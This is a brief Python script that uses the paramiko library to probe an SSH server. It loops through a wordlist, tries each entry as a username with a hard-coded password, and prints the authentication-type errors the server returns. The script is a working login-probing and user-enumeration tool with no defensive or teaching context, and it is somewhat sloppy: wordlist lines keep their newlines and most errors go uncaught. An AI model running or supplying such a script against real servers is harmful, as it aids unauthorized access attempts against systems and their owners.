import paramiko
import sys

if len(sys.argv) < 3:
	print(f"use: python {sys.argv[0]} target path/to/wordlist.txt")
	sys.exit(1)

target = sys.argv[1]
wordlist = sys.argv[2]

with open(wordlist, "r") as f:
	word_list = f.readlines()
	for word in word_list:
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(target, username=word, password="dor")
		except paramiko.ssh_exception.BadAuthenticationType as e:
			print(f"{word}: {e}\n")
		ssh.close()
